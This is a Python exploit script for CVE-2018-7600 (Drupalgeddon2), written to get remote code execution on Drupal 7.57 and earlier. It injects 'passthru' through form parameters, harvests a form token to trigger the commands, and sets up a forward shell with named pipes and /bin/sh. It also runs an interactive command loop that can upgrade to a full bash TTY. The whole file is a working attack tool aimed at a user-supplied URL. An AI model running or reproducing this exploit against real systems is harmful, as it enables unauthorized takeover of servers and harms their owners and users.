#!/usr/bin/env python3

# Exploit Title: Drupalgeddon2 Remote Code Execution
# Exploit Author: Bryan Muñoz (ret2x)
# Vulnerability Discovered: Drupal Security Team
# Version: Drupal <= 7.57
# Tested on: Linux
# CVE: CVE-2018-7600
# References: https://ine.com/blog/cve-2018-7600-drupalgeddon-2

import argparse
import random
import re
import requests
from time import sleep
import sys


class DrupalgeddonExploit():
    def __init__(self):
        self.id = random.randrange(10000, 99999)
        self.input = f"/dev/shm/stdin-{self.id}"
        self.output = f"/dev/shm/stdout-{self.id}"
        self.prompt = "(Cmd) "

    # Exploit the vulneravility
    def exploiting_rce(self, url, command, timeout=None):
        get_data = {
            'q': 'user/password',
            'name[#post_render][]': 'passthru',
            'name[#type]': 'markup',
            'name[#markup]': command
        }

        post_data = {
            'form_id': 'user_pass',
            '_triggering_element_name': 'name',
            '_triggering_element_value': '',
            'opz': 'E-mail+new+Password'
        }

        try:
            r = requests.post(url, params=get_data,
                              data=post_data, timeout=timeout)
            token = re.findall(r'form-\S{43}', r.text)[0]
        except Exception as e:
            print(f"Token was not retrieved. Error on {e}")
            sys.exit()

        get_data = {'q': f'file/ajax/name/#value/{token}'}
        post_data = {'form_build_id': token}

        try:
            r = requests.post(url, params=get_data,
                              data=post_data, timeout=timeout)
            output = re.sub(r'\[{"command.*', '', r.text)
            return output
        except requests.exceptions.ReadTimeout:
            pass

    # Check if the command is executed
    def check(self, url):
        response = self.exploiting_rce(url, "whoami")
        if response:
            return response
        else:
            print("The command was not executed")
            sys.exit()

    # Initiate forward shell
    def cr_pipe(self, url):
        self.exploiting_rce(url, f"mkfifo {self.input}")
        self.exploiting_rce(
            url, f"tail -f {self.input} | /bin/sh 2>&1 > {self.output}", timeout=0.1)

    def commands(self, url, command):
        self.exploiting_rce(url, f"echo {command} > {self.input}")
        sleep(0.4)
        ans = self.exploiting_rce(
            url, f"cat {self.output}; echo -n > {self.output}")
        return ans

    def cmdloop(self, url):
        while True:
            command = input(self.prompt)
            if command == "upgrade":
                print(self.commands(url, "script -qc /bin/bash /dev/null"), end="")
                self.commands(url, "stty raw -echo")
                self.prompt = ""
            elif command == "help" and self.prompt == "(Cmd) ":
                print(
                    "upgrade [spawn a full tty shell]\nexit [close the shell]")
            elif command == "exit" and self.prompt == "(Cmd) ":
                break
            else:
                print(self.commands(url, command), end="")


if __name__ == "__main__":
    # Define arguments
    parser = argparse.ArgumentParser(
        description="Drupalgeddon2 RCE on Drupal <= 7.57")
    parser.add_argument("-u", "--url", required=True, help="Target url")
    args = parser.parse_args()

    if args.url is None:
        sys.exit()

    url = args.url
    exploit = DrupalgeddonExploit()
    exploit.check(url)
    exploit.cr_pipe(url)
    try:
        exploit.cmdloop(url)
    except KeyboardInterrupt:
        pass
